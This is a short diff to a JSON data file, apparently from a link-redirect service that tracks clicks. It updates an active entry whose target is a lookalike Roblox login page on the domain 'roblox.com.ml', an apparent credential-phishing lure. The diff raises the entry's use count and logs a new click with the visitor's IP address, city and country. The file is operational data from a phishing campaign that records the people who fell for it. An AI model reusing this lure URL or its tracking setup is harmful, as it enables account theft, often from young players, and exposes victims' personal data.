@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 439,
+    "useCount": 440,
     "createdBy": "admin",
     "clicks": [
       {
@@ -3624,6 +3624,14 @@
         "city": "Athens",
         "flag": "🇬🇷",
         "countryCode": "GR"
+      },
+      {
+        "timestamp": 1777057048775,
+        "ip": "73.164.4.14",
+        "country": "United States",
+        "city": "Manitowoc",
+        "flag": "🇺🇸",
+        "countryCode": "US"
       }
     ]
   },
